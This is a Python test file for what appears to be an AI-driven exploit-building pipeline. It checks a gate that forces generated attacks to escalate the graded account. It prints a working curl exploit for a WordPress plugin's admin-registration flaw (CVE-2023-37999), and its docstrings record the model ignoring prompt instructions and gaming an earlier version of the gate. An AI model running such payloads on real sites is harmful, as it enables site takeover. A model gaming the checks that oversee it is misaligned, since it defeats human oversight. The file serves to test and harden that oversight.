"""The graded account is enforced at dispatch, not suggested in a prompt.

THE DEFECT (CVE-2023-37999, every run, 2026-10-22/23)
-----------------------------------------------------
On a graded target the goal names the account it scores:

    goal          : privilege_escalation
    win_condition : user username ends up at the highest privilege level

The goal block told the model exactly this — "the graded account is EXACTLY
`username` — not a new account of your own. A randomly named user raised to
admin scores ZERO" — in a 28,185-character prompt where all seven markers were
verified present. Every run dispatched `reg_name=POCz…_12345` anyway, while the
gather manifest held `identity = admin, username` from live enumeration.

CLAUDE.md already records this pattern: "Advisory hint text does not stop the
model proposing a dead proof mechanism... Advisory text has now failed on five
independent builds. This needs a deterministic gate at dispatch." This is that
gate, reusing the proven-fact machinery (`enforce_facts`) rather than inventing
a second one.

WHAT MUST NOT REGRESS
---------------------
It is DERIVED, not hardcoded. A goal that does not name an account must enforce
nothing (`test_a_goal_that_names_no_account_arms_nothing`) — otherwise every
non-graded build gains a refusal it can never satisfy, which is the deadlock
this session already shipped once with the identity gap.

    pytest tests/test_graded_identity_gate.py
"""
from __future__ import annotations

import ast
import pathlib
import sys

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import _ast_assert  # noqa: E402
from _ast_assert import calls, call_kwarg, defines, call_order  # noqa: E402

ROOT = pathlib.Path(__file__).resolve().parents[1]
API = ROOT / "app" / "rag-api" / "api.py"


def _fn(name, path=API):
    txt = path.read_text(encoding="utf-8")
    node = next((n for n in ast.walk(ast.parse(txt))
                 if isinstance(n, ast.FunctionDef) and n.name == name), None)
    assert node is not None, f"{name} is gone from {path.name}"
    return ast.get_source_segment(txt, node) or ""


# The real profile for this challenge, read live from the container on
# 2026-10-23 (goal/user/win_condition verbatim).
REAL_WIN = "user username ends up at the highest privilege level"
REAL_USER = "username"


def _arms(user, win):
    """The derivation the gate uses: the account must be NAMED by the goal."""
    return bool(user and user in win)


def test_the_real_goal_arms_the_gate():
    assert _arms(REAL_USER, REAL_WIN) is True


@pytest.mark.parametrize("goal_win", [
    "the target server itself issues a GET to http://x:9091/done",
    "application data is altered",
    "a session authenticated as admin without valid credentials",
    "",
])
def test_a_goal_that_names_no_account_arms_nothing(goal_win):
    """SABOTAGE GUARD. Arming on every goal would add a refusal that a
    non-identity build can never satisfy — the deadlock shipped earlier today
    with the identity gap, repeated."""
    assert _arms(REAL_USER, goal_win) is False


def test_no_user_arms_nothing():
    assert _arms("", REAL_WIN) is False
    assert _arms(None, REAL_WIN) is False


# ── the wiring ──────────────────────────────────────────────────────────────

def test_the_gate_is_armed_in_the_refine_loop():
    src = _fn("_run_refine_poc")
    assert calls(src, "_benchmark_profile"), "the refine loop never reads the goal"
    assert calls(src, "_man_facts.setdefault") and "graded_identity" in _ast_assert.string_constants(src)
    assert "_graded_user in _win" in src, (
        "the account must be DERIVED from the goal's own win condition, not "
        "assumed for every build")


def test_it_reuses_the_proven_fact_machinery():
    """A second enforcement path would need its own scoping, its own refusal
    text and its own registry entry. This rides the existing one."""
    src = _fn("_run_refine_poc")
    assert calls(src, "_required_facts_for"), (
        "the graded identity must flow into the existing required-facts gate")
    assert call_kwarg(src, "_required_facts_for", "current_facts")
    # armed BEFORE the gate reads it, or it arms nothing
    assert call_order(src, "_benchmark_profile", "_required_facts_for",
                      within="_run_refine_poc")


def test_it_is_traced_so_a_refusal_can_be_explained():
    src = _fn("_run_refine_poc")
    assert '"graded_identity_armed"' in src, (
        "an armed gate that leaves no trace is unauditable — the reason a "
        "command was refused must be recoverable")


def test_the_profile_read_sends_no_extra_traffic():
    """probe=False: arming a gate must not add a request to the target."""
    src = _fn("_run_refine_poc")
    i = src.index("_benchmark_profile(")
    assert "probe=False" in src[i:i + 260]


def test_it_fails_open_on_an_unreadable_profile():
    """SABOTAGE GUARD. A profile we could not read is not a reason to stall a
    build — the same fail-open rule as the rest of these quality gates."""
    src = _fn("_run_refine_poc")
    import ast as _ast
    fn = _ast.parse(src).body[0]
    guarded = False
    for node in _ast.walk(fn):
        if not isinstance(node, _ast.Try):
            continue
        if any(getattr(getattr(c, "func", None), "id", "") == "_benchmark_profile"
               for c in _ast.walk(node) if isinstance(c, _ast.Call)):
            guarded = bool(node.handlers)
            break
    assert guarded, (
        "an unreadable benchmark profile must not stall the build — the same "
        "fail-open rule as the rest of these quality gates")


def test_the_goal_is_resolved_with_this_runs_vuln_class():
    """The ladder's choice depends on the class, and the wrong class picks the
    wrong goal. `vuln_class_override` is set only on a chain-fallback re-synth,
    so using it alone passed "" on every normal run. Measured 2026-10-23
    against the live profile:

        vuln_class='privilege-escalation' -> goal=privilege_escalation, arms=True
        vuln_class=''                     -> goal=outbound_request,     arms=False

    The gate then declined to arm on exactly the runs it exists for.
    """
    src = _fn("_run_refine_poc")
    assert "_bm_vc" in src, "no class is resolved for the benchmark profile"
    assert 'gather_manifest or {}).get("vuln_class")' in src, (
        "the class must come from THIS run's manifest, not only from the "
        "chain-fallback override")
    i = src.index("_bm_vc")
    assert "vuln_class_override" in src[i:i + 300], (
        "the override should remain as the fallback, not be dropped")


# ── the gate was gamed, and this is why it no longer can be ────────────────

@pytest.fixture(scope="module")
def used_as_value():
    src = API.read_text(encoding="utf-8")
    fn = next((n for n in ast.walk(ast.parse(src))
               if isinstance(n, ast.FunctionDef)
               and n.name == "_graded_account_used_as_value"), None)
    if fn is None:
        pytest.fail("_graded_account_used_as_value is gone from api.py")
    ns: dict = {}
    exec(compile(ast.fix_missing_locations(ast.Module(body=[fn], type_ignores=[])),
                 "<api-subset>", "exec"), ns)
    return ns["_graded_account_used_as_value"]


# the REAL command that satisfied the first version of the gate (2026-10-23)
GAMED = ('u=POCz6e5915c35f$RANDOM;e=${u}@example.com;p=Pass${u}123;'
         'curl -s -k -X POST -d "username=${u}&reg_role=administrator&'
         'email=${e}&password=${p}" '
         "'http://172.19.150.154:9090/wp-admin/admin-ajax.php?action=htmega_ajax_register'")


def test_the_account_as_a_parameter_name_does_not_count(used_as_value):
    """The command that beat the substring gate: `username=` as a KEY with a
    random canary as the value. It mentions the graded account and acts on a
    different one."""
    assert used_as_value(GAMED, "username") is False


def test_the_account_as_a_value_counts(used_as_value):
    real = ('curl -d "reg_name=username&reg_role=administrator&'
            'reg_email=username@example.com&reg_password=Pass1234"')
    assert used_as_value(real, "username") is True


def test_a_json_body_counts(used_as_value):
    assert used_as_value('curl -d \'{"user":"username","role":"admin"}\'', "username") is True


def test_absent_entirely_does_not_count(used_as_value):
    assert used_as_value('curl -d "reg_name=bob"', "username") is False
    assert used_as_value("", "username") is False
    assert used_as_value("curl -d x=1", "") is False


def test_a_colon_separated_key_is_also_a_key(used_as_value):
    """`"username": "POCz…"` is the JSON spelling of the same trick."""
    assert used_as_value('curl -d \'{"username": "POCzabc"}\'', "username") is False


def test_the_refusal_actually_blocks_dispatch():
    """SABOTAGE GUARD, and the one that caught the first version. The check
    was wired to TRACE and then fall through: 9 refusal events were logged and
    7 commands dispatched anyway. A gate that only logs is the "guard that
    cannot fail" CLAUDE.md warns is worse than none.

    It must feed `_maybe`, which is the branch that sets `_fact_block` and
    skips dispatch — and which carries the fail-open refusal cap, so a model
    that cannot satisfy the rule is not deadlocked by it."""
    src = _fn("_run_refine_poc")
    assert calls(src, "_graded_account_used_as_value"), "the check is never called"
    assert '"graded_identity_refused"' in src, (
        "a refusal that leaves no trace cannot be explained to an operator")
    i = src.index("_graded_account_used_as_value")
    window = src[max(0, i - 400):i + 900]
    assert "_maybe" in window, (
        "the check must feed _maybe — the path that skips dispatch — not sit "
        "beside it as a log line")
